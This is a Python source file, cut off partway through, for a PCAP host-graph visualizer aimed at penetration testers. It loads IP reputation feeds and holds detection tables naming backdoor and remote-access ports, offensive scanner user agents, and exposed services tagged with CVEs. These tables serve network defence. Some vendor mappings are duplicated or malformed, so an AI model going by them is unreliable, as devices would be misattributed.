#!/usr/bin/env python3
"""
Deadfall — Interactive host-graph visualizer for PCAP files.

Parses a pcap/pcapng, builds a host graph (IPs = nodes, flows = edges),
runs a battery of pentester-oriented security detectors, and serves an
interactive UI.

Usage:
    python3 deadfall.py capture.pcap
    # then open http://127.0.0.1:5000

Author: built for Isaac @ Packetlabs
"""
import argparse
import base64
import ipaddress
import json
import math
import os
import re
import socket
import struct
import sys
import tempfile
import threading
import time
from collections import defaultdict, Counter
from concurrent.futures import ThreadPoolExecutor

from flask import Flask, jsonify, render_template, request, send_file, send_from_directory

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# rtnetlink monkeypatch for scapy IPv6 route enumeration (see Claude.md — don't remove)
try:
    import scapy.arch.linux.rtnetlink as _rt
    _rt.read_routes6 = lambda: []
except Exception:
    pass
try:
    import scapy.utils6 as _u6
    _u6.construct_source_candidate_set = lambda *a, **kw: []
except Exception:
    pass

from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import ARP
from scapy.packet import Raw
from scapy.utils import PcapReader, PcapWriter
from scapy.sendrecv import sniff
try:
    from scapy.arch import get_if_list
except Exception:
    def get_if_list():
        return []
try:
    from scapy.layers.inet6 import IPv6, ICMPv6ND_RA
except Exception:
    IPv6 = None
    ICMPv6ND_RA = None
try:
    from scapy.layers.dns import DNS, DNSRR, DNSQR
except Exception:
    DNS = None
    DNSRR = None
    DNSQR = None
try:
    from scapy.layers.dhcp import BOOTP, DHCP
except Exception:
    BOOTP = None
    DHCP = None
try:
    from ipwhois import IPWhois
    HAS_IPWHOIS = True
except ImportError:
    HAS_IPWHOIS = False


# ---------------------------------------------------------------------------
# Device identity: OUI vendor lookup, hostname extraction, device-type guess.
# All offline. Wireshark's manuf overrides the embedded table when present.
# ---------------------------------------------------------------------------

# Embedded OUI table (first 6 hex chars of MAC, lowercase, no separators).
# Curated for common LAN gear; manuf file gives the long tail.
OUI_VENDORS = {
    # Apple
    "000393": "Apple", "001124": "Apple", "001451": "Apple", "0017f2": "Apple",
    "001b63": "Apple", "001d4f": "Apple", "001ef3": "Apple", "001ff3": "Apple",
    "002241": "Apple", "0023df": "Apple", "0024d7": "Apple", "0025bc": "Apple",
    "00264a": "Apple", "0026b0": "Apple", "0026bb": "Apple", "08e689": "Apple",
    "10ddb1": "Apple", "1c1ac0": "Apple", "28cfe9": "Apple", "34159e": "Apple",
    "3c0754": "Apple", "3c2eff": "Apple", "40331a": "Apple", "488ad2": "Apple",
    "4c8d79": "Apple", "5cf938": "Apple", "60334b": "Apple", "68a86d": "Apple",
    "6c7e67": "Apple", "70cd60": "Apple", "78fd94": "Apple", "7c6d62": "Apple",
    "80929f": "Apple", "885395": "Apple", "8c2937": "Apple", "98d6f7": "Apple",
    "a45e60": "Apple", "a4d18c": "Apple", "ace4b8": "Apple", "b4f0ab": "Apple",
    "b8634d": "Apple", "b8e856": "Apple", "bc926b": "Apple", "c869cd": "Apple",
    "d8a25e": "Apple", "dc2b2a": "Apple", "f0dbe2": "Apple",
    # Microsoft
    "000d3a": "Microsoft", "0017fa": "Microsoft", "0050f2": "Microsoft",
    "28183e": "Microsoft", "485073": "Microsoft", "60450b": "Microsoft",
    "7c1e52": "Microsoft", "98c869": "Microsoft", "c83f26": "Microsoft",
    # Dell
    "000bdb": "Dell", "001143": "Dell", "0014c2": "Dell", "0018f3": "Dell",
    "0021b6": "Dell", "0022d3": "Dell", "002219": "Dell", "00248c": "Dell",
    "08002b": "Dell", "10604b": "Dell", "1866da": "Dell", "1c1d1d": "Dell",
    "246e96": "Dell", "3417eb": "Dell", "5cf9dd": "Dell", "b083fe": "Dell",
    "b44506": "Dell", "b8ca3a": "Dell", "ec22ba": "Dell", "f8b156": "Dell",
    "f8cab8": "Dell", "f8db88": "Dell",
    # Cisco
    "00000c": "Cisco", "000142": "Cisco", "00036b": "Cisco", "0006d6": "Cisco",
    "000bbe": "Cisco", "000e08": "Cisco", "000e84": "Cisco", "001007": "Cisco",
    "001bd4": "Cisco", "0021a0": "Cisco", "002255": "Cisco", "00b000": "Cisco",
    "1cdf0f": "Cisco", "204e7f": "Cisco", "44d3ca": "Cisco", "586d8f": "Cisco",
    "6c50ad": "Cisco", "881dfc": "Cisco", "a45630": "Cisco", "bc671c": "Cisco",
    "e8d322": "Cisco", "f0ee10": "Cisco",
    # HP / Hewlett Packard / HPE / Aruba
    "001083": "HP", "001321": "HP", "0014c2": "HP", "0017a4": "HP",
    "001a4b": "HP", "001b78": "HP", "001cc4": "HP", "00237d": "HP",
    "002655": "HP", "002a10": "HP", "086618": "HPE", "10604b": "HP",
    "3024a9": "HP", "94ff3c": "HP", "b8af67": "HP",
    "9c1c12": "Aruba", "94b40f": "Aruba", "ac1f6b": "Aruba",
    # Intel
    "001500": "Intel", "001e64": "Intel", "0021cc": "Intel", "001b21": "Intel",
    "001f3c": "Intel", "1c697a": "Intel", "5c514f": "Intel", "ac675d": "Intel",
    "c0d4e9": "Intel", "f8632a": "Intel", "fcaa14": "Intel",
    # Samsung
    "001632": "Samsung", "0023d6": "Samsung", "002399": "Samsung", "0026e2": "Samsung",
    "0c1420": "Samsung", "0c8910": "Samsung", "143f9a": "Samsung", "289eda": "Samsung",
    "2cae2b": "Samsung", "3413e8": "Samsung", "44783e": "Samsung", "5492bf": "Samsung",
    "78ea50": "Samsung", "8425db": "Samsung", "885a92": "Samsung", "94350a": "Samsung",
    "a0214c": "Samsung",
    # Google / Nest / Chromecast / Pixel
    "0008c7": "Google", "001a11": "Google", "20df0c": "Google", "30fd38": "Google",
    "4cb858": "Google", "5444a3": "Google", "6466b3": "Google", "847a88": "Google",
    "9059af": "Google", "94eb2c": "Google", "a4773e": "Google", "f4f5d8": "Google",
    "f4f5e8": "Google",
    "18b430": "Nest", "64169c": "Nest",
    # Amazon (Echo, Fire, Ring)
    "001de1": "Amazon", "00fc8b": "Amazon", "041bc7": "Amazon", "0c47c9": "Amazon",
    "1841a7": "Amazon", "34d270": "Amazon", "40b4cd": "Amazon", "44650d": "Amazon",
    "50f5da": "Amazon", "5c41e7": "Amazon", "68dbf5": "Amazon", "747548": "Amazon",
    "7ce441": "Amazon", "84d6d0": "Amazon", "881fa1": "Amazon", "a002dc": "Amazon",
    "ac63be": "Amazon", "b4f1da": "Amazon", "b85ee1": "Amazon", "f0d2f1": "Amazon",
    "f0f0a4": "Amazon", "fc65de": "Amazon",
    # Roku
    "002a3c": "Roku", "00f0d4": "Roku", "08056d": "Roku", "0c5f35": "Roku",
    "20fe83": "Roku", "2c83cd": "Roku", "5c497b": "Roku", "8052ed": "Roku",
    "b0a737": "Roku", "ac3a7a": "Roku", "b83e59": "Roku", "c83a35": "Roku",
    "cca12b": "Roku", "d8311c": "Roku", "d83134": "Roku", "dc3a5e": "Roku",
    # Sonos
    "000e58": "Sonos", "5caafd": "Sonos", "78282a": "Sonos", "94f8e0": "Sonos",
    "9c5cf9": "Sonos", "b8e937": "Sonos",
    # LG
    "00059a": "LG", "001fe3": "LG", "001f6b": "LG", "00259e": "LG",
    "0026e2": "LG", "10683f": "LG", "344df7": "LG", "382c4a": "LG",
    "58a2b5": "LG", "84a466": "LG", "94e90f": "LG", "98d6bb": "LG",
    "ac0d1b": "LG", "b8ad3e": "LG", "c80210": "LG", "f8a9d0": "LG",
    # Sony / PlayStation
    "0013a9": "Sony", "001a80": "Sony", "001dba": "Sony", "0024bf": "Sony",
    "00257b": "Sony", "2c8158": "Sony", "30f31d": "Sony", "54420e": "Sony",
    "5c4327": "Sony", "780489": "Sony", "8400d2": "Sony", "9803d8": "Sony",
    "ac9b84": "Sony", "fcf152": "Sony",
    # Nintendo
    "0009bf": "Nintendo", "001656": "Nintendo", "0017ab": "Nintendo", "0019fd": "Nintendo",
    "001bea": "Nintendo", "001cbe": "Nintendo", "001ddc": "Nintendo", "001e35": "Nintendo",
    "001f32": "Nintendo", "002709": "Nintendo", "0403d6": "Nintendo", "182a7b": "Nintendo",
    "344aa4": "Nintendo", "40d28a": "Nintendo", "582f40": "Nintendo", "606bff": "Nintendo",
    "78a2a0": "Nintendo", "7c5cf8": "Nintendo", "8418fb": "Nintendo", "8c56c5": "Nintendo",
    "98b6e9": "Nintendo", "98e8fa": "Nintendo", "a45c27": "Nintendo", "b88aec": "Nintendo",
    "cc9e00": "Nintendo", "ccfb65": "Nintendo", "e84ece": "Nintendo",
    # Telco / STB / Mesh OEMs
    "d4351d": "Technicolor",         # Technicolor Delivery (Telus/Bell STB + Wi-Fi)
    "54b7bd": "Hon Hai",              # Foxconn — many STB carriers
    "001d6a": "Hon Hai", "00188b": "Hon Hai",
    "002339": "Hon Hai", "1c66aa": "Hon Hai",
    "34194d": "Hitron",               # Hitron Technologies (cable modems / gateways)
    "002545": "Hitron", "684a76": "Hitron", "841b5e": "Hitron",
    "ccf735": "Sercomm",              # Telus mesh / set-top
    "001736": "Sercomm", "005026": "Sercomm",
    "283926": "Quantenna",            # Wi-Fi chipset, common in STB radios
    "001ee5": "ARRIS",                # ARRIS modems / STB
    "0010a4": "ARRIS", "00257f": "ARRIS",
    "2c302c": "ARRIS", "ac8e07": "ARRIS",
    "002354": "Pace",                 # Pace STB (now Arris)
    "001a79": "AirTies",              # Mesh AP OEM
    "001550": "Zenterio",             # ZIDS_OUI=9855 (Zenterio-derived STB sticker)
    # Routers / SOHO networking
    "001a2b": "TP-Link", "001fc6": "TP-Link", "10feed": "TP-Link", "14cc20": "TP-Link",
    "1c61b4": "TP-Link", "3460f9": "TP-Link", "40169f": "TP-Link", "48a6b8": "TP-Link",
    "5c628b": "TP-Link", "6466b3": "TP-Link", "747295": "TP-Link", "98ded0": "TP-Link",
    "a42bb0": "TP-Link", "c4e90a": "TP-Link", "ec086b": "TP-Link", "f0f249": "TP-Link",
    "001346": "Netgear", "001b2f": "TP-Link", "001e2a": "Netgear", "001f33": "Netgear",
    "002624": "Netgear", "04a151": "Netgear", "08bd43": "Netgear", "10da43": "Netgear",
    "20e52a": "Netgear", "44a56e": "Netgear", "6cb0ce": "Netgear", "9c3dcf": "Netgear",
    "001a70": "Linksys", "0023694": "Linksys", "002692": "Linksys", "60381f": "Linksys",
    "98fc11": "Linksys", "c0c1c0": "Linksys",
    "0015e9": "D-Link", "001b11": "D-Link", "001cf0": "D-Link", "001e58": "D-Link",
    "002191": "D-Link", "00226b": "D-Link", "002401": "D-Link", "0024a5": "D-Link",
    "002618": "D-Link", "1cbdb9": "D-Link", "5cd998": "D-Link", "84c9b2": "D-Link",
    "002354": "ASUS", "001632": "ASUS", "002154": "ASUS", "1c872c": "ASUS",
    "381a52": "ASUS", "40167e": "ASUS", "48eb22": "ASUS", "5404a6": "ASUS",
    "60a44c": "ASUS", "704d7b": "ASUS", "ac220b": "ASUS", "bcaec5": "ASUS",
    "fc3497": "Ubiquiti", "0418d6": "Ubiquiti", "245a4c": "Ubiquiti", "44d9e7": "Ubiquiti",
    "687251": "Ubiquiti", "74acb9": "Ubiquiti", "78a4c5": "Ubiquiti", "802aa8": "Ubiquiti",
    "f09fc2": "Ubiquiti", "f492bf": "Ubiquiti", "fcecda": "Ubiquiti",
    "4c5e0c": "MikroTik", "6c3b6b": "MikroTik", "b869f4": "MikroTik",
    "00237b": "MikroTik", "08552c": "MikroTik", "2cc81b": "MikroTik",
    # IoT / SBC / chipset
    "b827eb": "Raspberry Pi", "dca632": "Raspberry Pi", "e45f01": "Raspberry Pi",
    "2cf432": "Raspberry Pi", "d83add": "Raspberry Pi",
    "5ccf7f": "Espressif (ESP)", "240ac4": "Espressif (ESP)", "30aea4": "Espressif (ESP)",
    "84f3eb": "Espressif (ESP)", "a020a6": "Espressif (ESP)", "bcddc2": "Espressif (ESP)",
    "ecfabc": "Espressif (ESP)",
    # Phones / handset OEMs
    "0023a7": "Huawei", "0023f4": "Huawei", "002568": "Huawei", "002eea": "Huawei",
    "0046f0": "Huawei", "1cab01": "Huawei", "2c5bb8": "Huawei", "44a191": "Huawei",
    "48ad08": "Huawei", "60d8ac": "Huawei", "84a8e4": "Huawei", "98e7f5": "Huawei",
    "001ef8": "Xiaomi", "0c1dc2": "Xiaomi", "1c2e57": "Xiaomi", "286c07": "Xiaomi",
    "346895": "Xiaomi", "4c34f8": "Xiaomi", "5440ad": "Xiaomi", "780bce": "Xiaomi",
    "8cbeac": "Xiaomi", "98fa9b": "Xiaomi", "a02693": "Xiaomi", "fc6473": "Xiaomi",
    # Printers
    "001a4d": "Brother", "008092": "Brother", "30055c": "Brother",
    "001b32": "Canon", "00bbc1": "Canon", "043f72": "Canon",
    "08006e": "Epson", "00a7bd": "Epson", "30cda7": "Epson",
    "0023fb": "Konica Minolta",
    # NAS
    "001132": "Synology", "0011327": "Synology", "0024fe": "AVM (Fritzbox)",
    "001ddf": "QNAP", "0040ca": "QNAP", "245ebe": "QNAP",
    # VoIP
    "000fcc": "Polycom", "0090f8": "Polycom",
    "0017ff": "Snom", "0024ae": "Snom",
    "001565": "Yealink", "805ec0": "Yealink",
    # Hypervisor / virtual
    "000c29": "VMware", "001c14": "VMware", "005056": "VMware", "001569": "VMware",
    "080027": "VirtualBox", "525400": "QEMU/KVM",
    "0003ff": "Hyper-V", "00155d": "Hyper-V",
    "001876": "Parallels", "001c42": "Parallels", "00163e": "Xen",
}

_MANUF_PATHS = [
    "/usr/share/wireshark/manuf",
    "/opt/wireshark/manuf",
    "/usr/local/share/wireshark/manuf",
]
_manuf_cache = None  # dict mapping 6-hex prefix -> (short, long)


def _load_manuf():
    """Load Wireshark's manuf file once. Returns dict or {} if not found."""
    global _manuf_cache
    if _manuf_cache is not None:
        return _manuf_cache
    _manuf_cache = {}
    for path in _MANUF_PATHS:
        if not os.path.exists(path):
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.split("#", 1)[0].strip()
                    if not line:
                        continue
                    parts = re.split(r"\s+", line, maxsplit=2)
                    if len(parts) < 2:
                        continue
                    mac_part = parts[0]
                    # Only handle 24-bit OUIs for now; ignore the longer (28/36-bit) ranges.
                    if "/" in mac_part:
                        continue
                    macnorm = mac_part.replace(":", "").replace("-", "").lower()
                    if len(macnorm) < 6:
                        continue
                    key = macnorm[:6]
                    short = parts[1]
                    long_ = parts[2] if len(parts) >= 3 else short
                    _manuf_cache[key] = (short, long_)
            break  # first match wins
        except Exception:
            continue
    return _manuf_cache


def lookup_vendor(mac):
    """Best-effort vendor name for a MAC. None if unknown / invalid."""
    if not mac:
        return None
    m = mac.lower().replace(":", "").replace("-", "")
    if len(m) < 6:
        return None
    # Locally-administered MACs (2nd hex bit of first octet set) are randomized;
    # don't claim a vendor for them — they're per-association MACs (Wi-Fi privacy).
    try:
        first = int(m[:2], 16)
        if first & 0x02:
            return "(randomized MAC)"
    except Exception:
        pass
    prefix = m[:6]
    manuf = _load_manuf()
    if prefix in manuf:
        short, long_ = manuf[prefix]
        # Prefer the "long" name if it's not a numeric placeholder.
        return long_ if long_ and not long_.startswith("0x") else short
    return OUI_VENDORS.get(prefix)


# Vendor → likely device-class hint (only fires when ports/proto don't tell us more).
_VENDOR_CLASS = {
    "Apple": "apple-device", "Samsung": "phone-or-tv", "Google": "google-device",
    "Amazon": "echo-or-fire", "Roku": "stb", "Sonos": "speaker", "Nest": "iot",
    "LG": "tv-or-appliance", "Sony": "tv-or-console", "Nintendo": "console",
    "Technicolor": "stb-or-gateway", "Hitron": "modem-gateway",
    "ARRIS": "modem-gateway", "Pace": "stb", "Sercomm": "stb-or-mesh",
    "Quantenna": "wifi-radio", "Zenterio": "stb", "AirTies": "mesh-ap",
    "Aruba": "ap-or-switch", "Cisco": "router-or-switch", "Ubiquiti": "router-or-ap",
    "MikroTik": "router", "TP-Link": "router-or-ap", "Netgear": "router-or-ap",
    "Linksys": "router-or-ap", "D-Link": "router-or-ap", "ASUS": "pc-or-router",
    "Brother": "printer", "Canon": "printer", "Epson": "printer",
    "Konica Minolta": "printer",
    "Polycom": "voip", "Snom": "voip", "Yealink": "voip",
    "Raspberry Pi": "sbc", "Espressif (ESP)": "iot",
    "Synology": "nas", "QNAP": "nas",
    "Hon Hai": "consumer-electronics",
    "Huawei": "phone-or-router", "Xiaomi": "phone-or-iot",
    "Microsoft": "windows-pc", "Dell": "pc-or-server", "HP": "pc-printer-or-server",
    "Intel": "pc-or-nic", "Lenovo": "pc",
    "VMware": "virtual-host", "VirtualBox": "virtual-host",
    "QEMU/KVM": "virtual-host", "Hyper-V": "virtual-host",
}

# UPnP friendly types we recognize in SSDP Server strings → device-type guess.
_SSDP_TYPE_HINTS = [
    (re.compile(r"miniupnpd|InternetGatewayDevice|WANIPConnection", re.I), "router"),
    (re.compile(r"Cloudcheck|WANConnection|WANDevice", re.I), "router-or-mesh"),
    (re.compile(r"dial-multiscreen|MediaRenderer|MediaServer|zss/", re.I), "stb"),
    (re.compile(r"tvdevice|TV/|Smart TV", re.I), "tv"),
    (re.compile(r"sonos|MediaServer:1.*sonos", re.I), "speaker"),
    (re.compile(r"WFADevice|WFAWLANConfig", re.I), "wifi-ap"),
    (re.compile(r"Roku|RokuBox", re.I), "stb"),
    (re.compile(r"Camera|IPCamera|Hikvision|Dahua", re.I), "camera"),
    (re.compile(r"Printer", re.I), "printer"),
]


def infer_device_type(host):
    """Best-effort device-type label using SSDP / DHCP / ports / vendor."""
    # 1. SSDP Server string is the strongest signal.
    srv = host.get("ssdp_server") or ""
    for rx, lab in _SSDP_TYPE_HINTS:
        if rx.search(srv):
            return lab

    # 2. DHCP vendor-class id from the client itself.
    dvc = (host.get("dhcp_vendor_class") or "").lower()
    if dvc:
        if "quantenna" in dvc: return "wifi-radio"
        if "msft" in dvc:      return "windows-pc"
        if "android" in dvc:   return "phone-android"
        if "ios" in dvc or "iphone" in dvc or "ipad" in dvc: return "phone-ios"
        if "udhcp" in dvc:     return "embedded-linux"
        if "dhcpcd" in dvc:    return "linux"
        if "ciscovoip" in dvc or "yealink" in dvc or "polycom" in dvc: return "voip"
        if "broadbandforum" in dvc or "stb" in dvc or "uiw" in dvc: return "stb"

    # 3. Port-based heuristics on listening ports.
    listening = host.get("ports_listening") or set()
    if 9100 in listening: return "printer"            # raw RAW print
    if 631 in listening:  return "printer"            # IPP
    if 5060 in listening or 5061 in listening: return "voip"
    if 1883 in listening or 8883 in listening: return "iot-mqtt"
    if 502 in listening:  return "ics-modbus"
    if 102 in listening:  return "ics-siemens"
    if 47808 in listening: return "ics-bacnet"
    if 8009 in listening: return "chromecast"
    if 3389 in listening: return "windows-pc"
    if 5985 in listening or 5986 in listening: return "windows-server"
    if 22 in listening and 80 in listening and 443 in listening:
        return "linux-server"
    if 8080 in listening and 80 in listening and 443 in listening:
        # SPA admin UI with a redirect → likely a managed gateway/STB box
        return "embedded-admin-ui"
    if 53 in listening:   return "dns-or-router"
    if 67 in listening:   return "dhcp-server"

    # 4. Vendor fallback.
    v = host.get("vendor")
    if v and v in _VENDOR_CLASS:
        return _VENDOR_CLASS[v]
    return None


# ---------------------------------------------------------------------------
# IP-reputation feeds — offline aggregated blocklists, no API key required.
# Downloads ~10 public lists (FireHOL meta-feeds, Spamhaus DROP, ET, Abuse.ch,
# CINS, DShield, Blocklist.de, Tor exits) once per 24 h and caches under
# ~/.cache/deadfall/feeds/. Lookups are O(1) for exact IPs and a single linear
# scan over precomputed (net_int, mask_int) tuples for CIDRs.
# ---------------------------------------------------------------------------

REP_FEEDS = [
    # (name, url, kind='ip'|'cidr', tag)
    ("firehol-level1", "https://iplists.firehol.org/files/firehol_level1.netset", "cidr", "FireHOL L1"),
    ("firehol-level2", "https://iplists.firehol.org/files/firehol_level2.netset", "cidr", "FireHOL L2"),
    ("et-compromised", "https://rules.emergingthreats.net/blockrules/compromised-ips.txt", "ip", "ET compromised"),
    ("spamhaus-drop",  "https://www.spamhaus.org/drop/drop.txt", "cidr", "Spamhaus DROP"),
    ("spamhaus-edrop", "https://www.spamhaus.org/drop/edrop.txt", "cidr", "Spamhaus EDROP"),
    ("feodotracker",   "https://feodotracker.abuse.ch/downloads/ipblocklist.txt", "ip", "Feodo C2"),
    ("blocklist-de",   "https://lists.blocklist.de/lists/all.txt", "ip", "blocklist.de"),
    ("cins-army",      "https://cinsscore.com/list/ci-badguys.txt", "ip", "CINS bad"),
    ("tor-exits",      "https://check.torproject.org/torbulkexitlist", "ip", "Tor exit"),
]

# Tor exit is informational, not "malicious" per se — separated so the UI can downrank it.
INFO_ONLY_FEEDS = {"Tor exit"}


def _ip_to_int(ip_str):
    try:
        parts = ip_str.split(".")
        if len(parts) != 4:
            return None
        return ((int(parts[0]) << 24) | (int(parts[1]) << 16) |
                (int(parts[2]) << 8)  |  int(parts[3]))
    except Exception:
        return None


def _cidr_to_net_mask(cidr):
    """ '198.51.100.0/24'  ->  (net_int, mask_int).  None on parse error / IPv6."""
    try:
        if "/" in cidr:
            net, bits = cidr.split("/", 1)
            bits = int(bits)
        else:
            net, bits = cidr, 32
        if bits < 0 or bits > 32:
            return None
        n = _ip_to_int(net)
        if n is None:
            return None
        mask = 0xFFFFFFFF if bits == 32 else ((0xFFFFFFFF << (32 - bits)) & 0xFFFFFFFF)
        return (n & mask, mask)
    except Exception:
        return None


class ReputationFeeds:
    """Background-loaded aggregator over public IP blocklists."""

    REFRESH_SECONDS = 24 * 3600
    DOWNLOAD_TIMEOUT = 20

    def __init__(self, cache_dir=None, enabled=True):
        self.cache_dir = os.path.expanduser(cache_dir or "~/.cache/deadfall/feeds")
        self.enabled = enabled
        self.ip_index = {}        # "1.2.3.4" -> set(tag)
        self.cidr_list = []       # list of (net_int, mask_int, tag)
        self.feed_stats = {}      # name -> {tag, count, source, error}
        self.ready = threading.Event()
        self.lock = threading.Lock()
        if not self.enabled:
            self.ready.set()
            return
        try:
            os.makedirs(self.cache_dir, exist_ok=True)
        except Exception:
            # If we can't write cache, run in download-only memory mode.
            self.cache_dir = tempfile.mkdtemp(prefix="deadfall-feeds-")
        threading.Thread(target=self._load_all, daemon=True, name="feeds-loader").start()

    # -------- loader --------
    def _load_all(self):
        for name, url, kind, tag in REP_FEEDS:
            self._load_one(name, url, kind, tag)
        with self.lock:
            ip_n = len(self.ip_index)
            cidr_n = len(self.cidr_list)
        print(f"[*] reputation feeds loaded: {ip_n:,} IPs + {cidr_n:,} CIDRs across {len(self.feed_stats)} feeds",
              file=sys.stderr, flush=True)
        self.ready.set()

    def _load_one(self, name, url, kind, tag):
        cache_path = os.path.join(self.cache_dir, name + ".txt")
        text = None
        source = None
        # Use cache if fresh.
        try:
            if os.path.exists(cache_path):
                age = time.time() - os.path.getmtime(cache_path)
                if age < self.REFRESH_SECONDS:
                    with open(cache_path, "r", encoding="utf-8", errors="ignore") as f:
                        text = f.read()
                    source = "cache"
        except Exception:
            pass
        if text is None:
            try:
                import urllib.request, ssl
                ctx = ssl.create_default_context()
                req = urllib.request.Request(url, headers={"User-Agent": "Deadfall-Reputation/1.0"})
                with urllib.request.urlopen(req, timeout=self.DOWNLOAD_TIMEOUT, context=ctx) as r:
                    text = r.read().decode("utf-8", errors="ignore")
                source = "fresh"
                try:
                    with open(cache_path, "w", encoding="utf-8") as f:
                        f.write(text)
                except Exception:
                    pass
            except Exception as e:
                # Last-resort fallback to a stale cache.
                if os.path.exists(cache_path):
                    try:
                        with open(cache_path, "r", encoding="utf-8", errors="ignore") as f:
                            text = f.read()
                        source = "stale"
                    except Exception:
                        text = None
                if text is None:
                    self.feed_stats[name] = {"tag": tag, "count": 0, "source": None, "error": str(e)[:120]}
                    return
        # Parse.
        count = 0
        added_ip = self.ip_index
        added_cidr = self.cidr_list
        with self.lock:
            for line in text.splitlines():
                line = line.strip()
                if not line or line.startswith("#") or line.startswith(";") or line.startswith("//"):
                    continue
                # Many feeds have trailing comments after whitespace.
                token = line.split()[0].split(";", 1)[0].strip()
                if not token:
                    continue
                if kind == "ip" and "/" not in token:
                    # Plain dotted-quad.
                    if _ip_to_int(token) is None:
                        continue
                    s = added_ip.setdefault(token, set())
                    if tag not in s:
                        s.add(tag)
                        count += 1
                elif kind == "cidr" or "/" in token:
                    nm = _cidr_to_net_mask(token)
                    if nm is None:
                        continue
                    net, mask = nm
                    if mask == 0xFFFFFFFF:
                        # /32 — index as exact IP for the fast path.
                        ip_str = ".".join(str((net >> (8*(3-i))) & 0xFF) for i in range(4))
                        s = added_ip.setdefault(ip_str, set())
                        if tag not in s:
                            s.add(tag)
                            count += 1
                    else:
                        added_cidr.append((net, mask, tag))
                        count += 1
        self.feed_stats[name] = {"tag": tag, "count": count, "source": source, "error": None}

    # -------- lookup --------
    def lookup(self, ip_str):
        """Return list of feed-tags this IP appears on, or []."""
        if not self.ready.is_set():
            return []
        tags = set()
        with self.lock:
            exact = self.ip_index.get(ip_str)
            if exact:
                tags.update(exact)
            n = _ip_to_int(ip_str)
            if n is not None:
                for net, mask, tag in self.cidr_list:
                    if (n & mask) == net:
                        tags.add(tag)
        return sorted(tags)

    def is_malicious(self, tags):
        return any(t not in INFO_ONLY_FEEDS for t in tags)


# Module-level singleton; the worker starts immediately so feeds are ready by
# the time the user opens the UI.
reputation_feeds = ReputationFeeds()


def pick_hostname(host):
    """Pick the best hostname from all the sources we collected."""
    return (host.get("dhcp_hostname")
            or host.get("nbns_name")
            or host.get("mdns_local_name")
            or host.get("ssdp_friendly_name")
            or host.get("rdns_name")
            or None)


PLAINTEXT_PORTS = {
    21: "FTP",
    23: "TELNET",
    25: "SMTP",
    69: "TFTP",
    79: "FINGER",
    80: "HTTP",
    110: "POP3",
    119: "NNTP",
    143: "IMAP",
    161: "SNMP",
    389: "LDAP",
    512: "REXEC",
    513: "RLOGIN",
    514: "RSH/SYSLOG",
    1433: "MSSQL",
    2049: "NFS",
    3306: "MYSQL",
    5060: "SIP",
    5432: "POSTGRES",
    5900: "VNC",
    6379: "REDIS",
    6667: "IRC",
    8080: "HTTP-ALT",
    8000: "HTTP-ALT",
    11211: "MEMCACHED",
    27017: "MONGODB",
}

ENCRYPTED_PORTS = {
    22: "SSH",
    443: "HTTPS",
    465: "SMTPS",
    563: "NNTPS",
    636: "LDAPS",
    989: "FTPS-DATA",
    990: "FTPS",
    993: "IMAPS",
    995: "POP3S",
    3389: "RDP",
    5061: "SIPS",
    8443: "HTTPS-ALT",
}

COMMON_PORTS = {
    53: "DNS",
    67: "DHCP",
    68: "DHCP",
    88: "KERBEROS",
    123: "NTP",
    135: "MSRPC",
    137: "NETBIOS-NS",
    138: "NETBIOS-DGM",
    139: "NETBIOS-SSN",
    445: "SMB",
    546: "DHCPv6-CLIENT",
    547: "DHCPv6-SERVER",
    1900: "SSDP",
    4786: "CISCO-SMI",
    5353: "MDNS",
    5355: "LLMNR",
}

SUSPICIOUS_CLIENT_PORTS = {
    4444: "metasploit-default",
    5555: "adb/rat",
    6666: "common-rat",
    1337: "backdoor/ctf",
    31337: "elite-backdoor",
    8888: "miner/c2",
    9999: "common-rat",
    12345: "netbus",
    54321: "backdoor",
}

EXPOSED_SENSITIVE_PORTS = {21, 23, 25, 110, 135, 139, 445, 1433, 3306,
                          3389, 5432, 5900, 6379, 11211, 27017}

SEVERITY_RANK = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
SEVERITY_WEIGHT = {"critical": 10, "high": 6, "medium": 3, "low": 1, "info": 0}

SCANNER_USER_AGENTS = {
    "sqlmap": "sqlmap",
    "nikto": "Nikto",
    "nmap scripting engine": "Nmap NSE",
    "masscan": "masscan",
    "burp": "Burp Suite",
    "zap/": "OWASP ZAP",
    "zgrab": "zgrab",
    "metasploit": "Metasploit",
    "acunetix": "Acunetix",
    "nessus": "Nessus",
    "openvas": "OpenVAS",
    "wpscan": "WPScan",
    "gobuster": "gobuster",
    "dirbuster": "DirBuster",
    "ffuf": "ffuf",
    "hydra": "THC Hydra",
    "nuclei": "nuclei",
    "feroxbuster": "feroxbuster",
    "wfuzz": "wfuzz",
}

ICS_PORTS = {
    102:   ("S7COMM",      "Siemens S7 PLC"),
    502:   ("MODBUS",      "Modbus TCP — no authentication"),
    1089:  ("FF-ANNUNC",   "Fieldbus Foundation"),
    2222:  ("ETHERNET-IP", "EtherNet/IP implicit"),
    2404:  ("IEC-104",     "IEC 60870-5-104 SCADA"),
    4840:  ("OPC-UA",      "OPC UA"),
    9600:  ("OMRON-FINS",  "Omron FINS PLC"),
    20000: ("DNP3",        "DNP3 SCADA"),
    44818: ("ETHERNET-IP", "EtherNet/IP explicit (Allen-Bradley)"),
    47808: ("BACNET",      "BACnet building automation"),
}

INSECURE_MANAGEMENT_PORTS = {
    1883:  ("MQTT",             "MQTT broker (often cleartext creds)"),
    2375:  ("DOCKER-API",       "Docker remote API — unauthenticated RCE"),
    2376:  ("DOCKER-API-TLS",   "Docker remote API (TLS) — verify client auth"),
    2379:  ("ETCD",             "etcd client API"),
    2380:  ("ETCD-PEER",        "etcd peer port"),
    4505:  ("SALT-PUB",         "SaltStack publish (CVE-2020-11651)"),
    4506:  ("SALT-RET",         "SaltStack return (CVE-2020-11651)"),
    5672:  ("AMQP",             "AMQP — default guest/guest"),
    5985:  ("WINRM-HTTP",       "WinRM over HTTP (cleartext NTLM)"),
    6443:  ("KUBE-API",         "Kubernetes API server"),
    6782:  ("WEAVE",            "Weave control"),
    8086:  ("INFLUXDB",         "InfluxDB HTTP API"),
    8089:  ("SPLUNK-MGT",       "Splunk management"),
    8291:  ("MIKROTIK-WINBOX",  "MikroTik Winbox (CVE-2018-14847)"),
    9000:  ("PORTAINER",        "Portainer"),
    9090:  ("PROMETHEUS",       "Prometheus / Cockpit"),
    9200:  ("ELASTIC-HTTP",     "Elasticsearch (often unauthenticated)"),
    9300:  ("ELASTIC-TRANSPORT","Elasticsearch transport"),
